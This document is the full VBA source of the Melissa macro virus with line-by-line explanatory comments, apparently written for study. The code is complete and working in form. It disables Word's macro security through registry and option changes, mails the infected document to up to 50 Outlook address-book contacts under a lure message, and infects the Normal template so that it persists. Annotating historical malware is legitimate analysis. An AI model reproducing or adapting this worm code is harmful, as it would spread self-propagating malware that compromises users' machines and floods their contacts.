'Melissa Virus Source Code

'This line defines a private subroutine named Document_Open, which is an event handler. It triggers when the infected Word document is opened.
Private Sub Document_Open()
    'Suppress any errors that may occur
    On Error Resume Next

    ' This code weakens Word's security defenses, particularly those that guard against the execution of macros. By doing so, it makes it easier for malicious code to run without detection or interruption
    If System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") <> ""
    Then
        'Disables security for macros
        CommandBars("Macro").Controls("Security...").Enabled = False
        'This line sets the "Level" value in the Windows Registry to 1, potentially altering Word's security settings.
        System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") = 1&
    Else
        'Disables security for macros
        CommandBars("Tools").Controls("Macro").Enabled = False
        'These lines attempt to disable various Word options related to confirming conversions and saving normal prompts.
        Options.ConfirmConversions = (1 - 1): Options.VirusProtection = (1 - 1):
        Options.SaveNormalPrompt = (1 - 1)
    End If

    'This line declares three variables: UngaDasOutlook, DasMapiName, and BreakUmOffASlice without specifying their data types. These variables will be used to interact with the Outlook application.
    ' UngaDasOutlook is an instance of the Outlook application.
    ' DasMapiName is a reference to the MAPI (Messaging Application Programming Interface) namespace within Outlook.
    ' BreakUmOffASlice is a reference to an email object that is sent to the recipients.
    Dim UngaDasOutlook, DasMapiName, BreakUmOffASlice

    'This line creates an instance of the Outlook application and assigns it to the UngaDasOutlook variable. It allows the script to interact with Outlook to propagate the virus via email.
    Set UngaDasOutlook = CreateObject("Outlook.Application")

    'Here, the script sets DasMapiName to reference the MAPI (Messaging Application Programming Interface) namespace within Outlook.
    ' MAPI is used to access messaging functions like getting the addresses in the address list
    Set DasMapiName = UngaDasOutlook.GetNameSpace("MAPI")

    'This line checks the Windows Registry for a value named "Melissa?" under the specified registry key. If the value is not equal to "... by Kwyjibo," it means the virus has not yet infected the system.
    ' Only propagate the emails if the system is not already infected
    If System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\", "Melissa?") <> "... by Kwyjibo"

        Then
        'Confirms that the Outlook application instance is successfully created. in line 29
        If UngaDasOutlook = "Outlook" Then
            'This line attempts to log into an Outlook profile, but does not contain login credentials
            DasMapiName.Logon "profile", "password"
            'The script then enters a loop that iterates through the address books in Outlook and sends the infected document to up to 50 recipients from the address book. 
            ' It constructs the email subject, body text, and attaches the infected document to the email.
            For y = 1 To DasMapiName.AddressLists.Count
                Set AddyBook = DasMapiName.AddressLists(y)
                x = 1
                Set BreakUmOffASlice = UngaDasOutlook.CreateItem(0)
                For oo = 1 To AddyBook.AddressEntries.Count
                    Peep = AddyBook.AddressEntries(x)
                    BreakUmOffASlice.Recipients.Add Peep
                    x = x + 1
                    If x > 50 Then oo = AddyBook.AddressEntries.Count
                Next oo
                ' this is to entice the recipient to open up the attached document with the virus and infect their machine'
                ' Contains the user's name to appear more legit
                BreakUmOffASlice.Subject = "Important Message From " &
                Application.UserName
                BreakUmOffASlice.Body = "Here is that document you asked for ... don't
                show anyone else ;-)"
                BreakUmOffASlice.Attachments.Add ActiveDocument.FullName
                BreakUmOffASlice.Send
                Peep = ""

            Next y
            ' Log off from Outlook.
            DasMapiName.Logoff
        End If

        'In this line, the code sets a value in the Windows Registry under a specific key so that the virus will not propagate again due to the check in line 36
        System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\", "Melissa?") = "... by Kwyjibo"
    End If

    'These two lines set references to the first Visual Basic for Applications (VBA) components in the document
    ' ADI1 references the active document
    ' NTI1 references the NormalTemplate, which is the default template for new documents
    Set ADI1 = ActiveDocument.VBProject.VBComponents.Item(1)
    Set NTI1 = NormalTemplate.VBProject.VBComponents.Item(1)

    'These lines count the number of lines of code in the 2 documents
    NTCL = NTI1.CodeModule.CountOfLines
    ADCL = ADI1.CodeModule.CountOfLines
    'This line initializes a variable BGN to 2. Used for iterating over lines of code
    BGN = 2

    'If true, it means that the active document has not yet been infected
    If ADI1.Name <> "Melissa" Then
        'Delete all lines of code in the document's VBA component
        If ADCL > 0 Then _
            ADI1.CodeModule.DeleteLines 1, ADCL
            ' Set a reference to the VBA component that will be infected
            Set ToInfect = ADI1
            ' mark the component as infected
            ADI1.Name = "Melissa"
            'mark that the active document has been infected
            DoAD = True
        End If

    ' Similar to the above, but for the NormalTemplate
    If NTI1.Name <> "Melissa" Then
        If NTCL > 0 Then _
            NTI1.CodeModule.DeleteLines 1, NTCL
            Set ToInfect = NTI1
            NTI1.Name = "Melissa"
            DoNT = True
        End If

    ' If neither documents were infected, then the script jumps to the CYA label
    If DoNT <> True And DoAD <> True Then GoTo CYA

    'Normal template needs to be infected
    If DoNT = True Then
        'It clears any blank lines at the beginning of the document's VBA code.
        Do While ADI1.CodeModule.Lines(1, 1) = ""
            ADI1.CodeModule.DeleteLines 1
        Loop

        'Adds a new subroutine to the document's VBA component and copies the code from the Active Document's VBA component to the document NormalTemplate's VBA component. (ToInfect = NTI1)
        ToInfect.CodeModule.AddFromString ("Private Sub Document_Close()")

        ' The subroutine will be executed when documents created with the normal template are closed.
        Do While ADI1.CodeModule.Lines(BGN, 1) <> ""
            ToInfect.CodeModule.InsertLines BGN, ADI1.CodeModule.Lines(BGN, 1)
            BGN = BGN + 1
        Loop
    End If

    'Active document needs to be infected. 
    'Very similar to the one above except the subroutine runs on document open
    If DoAD = True Then
        Do While NTI1.CodeModule.Lines(1, 1) = ""
            NTI1.CodeModule.DeleteLines 1
        Loop

        ToInfect.CodeModule.AddFromString ("Private Sub Document_Open()")
        ' The subroutine will be executed when the active document is opened in the future
        Do While NTI1.CodeModule.Lines(BGN, 1) <> ""
            ToInfect.CodeModule.InsertLines BGN, NTI1.CodeModule.Lines(BGN, 1)
            BGN = BGN + 1
        Loop
    End If

    'If the computer has alr been infected, then the script jumps to the CYA label from line 108
    CYA:
        'These lines involve various conditions related to the document's name and the presence of lines of code in the VBA components. The script may save the document under certain conditions.
        If NTCL <> 0 And ADCL = 0 And (InStr(1, ActiveDocument.Name, "Document") = False) 
            Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
        ElseIf (InStr(1, ActiveDocument.Name, "Document") <> False) Then
            ActiveDocument.Saved = True: 

        End If
        'WORD/Melissa written by Kwyjibo
        'Works in both Word 2000 and Word 97
        'Worm? Macro Virus? Word 97 Virus? Word 2000 Virus? You Decide!
        'Word -> Email | Word 97 <--> Word 2000 ... it's a new age!

        ' if the minute is equal to the day, then the script will print out the following text into the document. 
        ' It is a reference to the Simpsons episode where Bart is playing scrabble with Lisa and cheats by adding the word "Kwyjibo" to the board
        If Day(Now) = Minute(Now) 
            Then Selection.TypeText " Twenty-two points, plus triple-word-score, plus fifty points for using all my letters.  Game's over. I'm outta here."
' Close the document
End Sub

' Capabilities of Melissa Virus
' - Propagate via email
' - Infects Word to run on document opening or closing
' - Disables Word's macro security
' - Prints out a quote from the Simpsons into the document